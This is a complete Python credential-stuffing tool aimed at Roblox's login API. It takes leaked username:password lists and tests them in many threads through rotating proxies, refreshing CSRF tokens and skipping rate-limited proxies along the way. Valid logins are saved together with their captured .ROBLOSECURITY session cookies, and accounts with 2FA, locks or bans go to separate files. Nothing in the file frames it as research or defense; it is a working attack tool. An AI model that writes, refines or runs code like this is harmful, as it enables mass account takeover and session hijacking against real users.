import os
import json
import random
import requests
import time
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

AVAILABLE_PROXIES = []
RATELIMITED_PROXIES = {}
SAMPLE_SIZE = 250
TIMEOUT = 15
MAX_RETRIES = 9e9

def load_config():
    try:
        with open("config.json") as f:
            return json.load(f)
    except FileNotFoundError:
        return None

def write_output(file, text, results_dir, encoding="utf-8", errors="ignore"):
    try:
        with open(os.path.join(results_dir, f"{file}.txt"), "a", encoding=encoding, errors=errors) as f:
            f.write(text)
    except Exception:
        pass

def login(session, headers, username, password):
    try:
        resp = session.post(
            url="https://auth.roblox.com/v2/login",
            headers=headers,
            json={
                "ctype": "Username",
                "cvalue": username,
                "password": password
            },
            timeout=TIMEOUT
        )
        return resp
    except requests.RequestException:
        return None

def process(resp, combo, STATS, results_dir):
    try:
        username, password = combo.split(":", maxsplit=1)
        STATS['TOTAL'] += 1
        progress(STATS)
        write_output("output", f"{resp.text}\n{combo}\n", results_dir)
        if "Incorrect username or password" in resp.text:
            STATS['INVALID'] += 1
            STATS['CHECKED'] += 1
            write_output("invalid", combo + '\n', results_dir)
        elif "Account has been locked." in resp.text or "Please use Social" in resp.text:
            write_output("locked", combo + '\n', results_dir)
            STATS['LOCKED'] += 1
            STATS['CHECKED'] += 1
        elif any(x in resp.text for x in ("You must pass the Security Question", "twoStepVerificationData")):
            write_output("2fa", combo + '\n', results_dir)
            STATS['2FA'] += 1
            STATS['CHECKED'] += 1
        elif "isBanned\":true" in resp.text:
            write_output("banned", combo + '\n', results_dir)
            STATS['BANNED'] += 1
            STATS['CHECKED'] += 1
        elif "displayName" in resp.text:
            cookie = resp.cookies.get(".ROBLOSECURITY")
            STATS['HITS'] += 1
            STATS['CHECKED'] += 1
            write_output("hits", f"{username}:{password}\n", results_dir)
            write_output("cookies", f"{cookie}\n", results_dir)
            write_output("UPC", f"{username}:{password}:{cookie}\n", results_dir)
    except Exception:
        pass

def worker(chunk, proxies_list, STATS, results_dir):
    session = requests.Session()
    retries = Retry(total=MAX_RETRIES, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))
    session.headers = {
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.6',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    for proxy in random.sample(proxies_list, min(len(proxies_list), SAMPLE_SIZE)):
        proxy_parts = proxy.split(":")
        proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}" if len(proxy_parts) == 4 else f"http://{proxy}"
        if proxy in RATELIMITED_PROXIES and time.time() - RATELIMITED_PROXIES[proxy] < 50:
            continue

        session.proxies = {"https": proxy_url}

        for combo in random.sample(chunk, min(len(chunk), SAMPLE_SIZE)):
            try:
                username, password = combo.split(":", maxsplit=1)
                resp = login(session, session.headers, username, password)
                if resp is not None:
                    process(resp, combo, STATS, results_dir)
                    if "x-csrf-token" in resp.headers:
                        session.headers["x-csrf-token"] = resp.headers["x-csrf-token"]
                        resp = login(session, session.headers, username, password)
                        if resp is not None:
                            process(resp, combo, STATS, results_dir)
                        if "Too many requests" in resp.text:
                            RATELIMITED_PROXIES[proxy] = time.time()
            except Exception:
                pass

    session.close()

def progress(STATS):
    try:
        print(f'\r{Fore.MAGENTA}[CHECKER]: {Fore.WHITE}TOTAL: {STATS["TOTAL"]} | {Fore.GREEN}CHECKED: {STATS["CHECKED"]} | {Fore.CYAN}HITS: {STATS["HITS"]} | {Fore.LIGHTMAGENTA_EX}2FA: {STATS["2FA"]} | {Fore.YELLOW}LOCKED: {STATS["LOCKED"]} | {Fore.RED}INVALID: {STATS["INVALID"]}', end='', flush=True)
    except Exception:
        pass

def existing(results_dir):
    existing_combos = set()
    result_files = ["hits", "invalid", "locked", "2fa", "banned"]
    for file_name in result_files:
        file_path = os.path.join(results_dir, f"{file_name}.txt")
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.read().splitlines()
                for line in lines:
                    existing_combos.add(line.strip())
    return existing_combos

def main():
    config = load_config()
    if not config:
        print(f"{Fore.RED}[CHECKER]: Configuration not found")
        return

    INPUT_DIR = config["input_dir"]
    PROXIES_FILE = os.path.join(INPUT_DIR, config["proxies_file"])
    COMBOS_FILE = os.path.join(INPUT_DIR, config["combos_file"])
    THREAD_COUNT = config["thread_count"]
    RESULTS_DIR = config["results_dir"]

    proxies_list = open(PROXIES_FILE, "r").read().splitlines()
    combos_list = list(set(line.strip() for line in open(COMBOS_FILE, "r", encoding="utf-8", errors="ignore").readlines()))

    existing_combos = existing(RESULTS_DIR)
    combos_list = [combo for combo in combos_list if combo not in existing_combos]

    if len(proxies_list) < 50:
        print(f"{Fore.RED}[CHECKER]: At least 50 proxies are required to run this checker.")
        return
    if len(combos_list) < 1000:
        print(f"{Fore.RED}[CHECKER]: At least 1000 accounts are required to run this checker.")
        return

    total_accounts = len(combos_list)

    STATS = {
        'TOTAL': 0,
        'CHECKED': 0,
        'HITS': 0,
        '2FA': 0,
        'LOCKED': 0,
        'BANNED': 0,
        'INVALID': 0
    }

    chunk_size = len(combos_list) // THREAD_COUNT
    combos_chunks = [combos_list[i:i + chunk_size] for i in range(0, len(combos_list), chunk_size)]

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        executor.map(lambda chunk: worker(chunk, proxies_list, STATS, RESULTS_DIR), combos_chunks)

    while STATS['CHECKED'] < total_accounts:
        time.sleep(1)

    print(f"{Fore.GREEN}[CHECKER]: All your accounts have been checked. Thanks for using this checker!")

if __name__ == '__main__':
    main()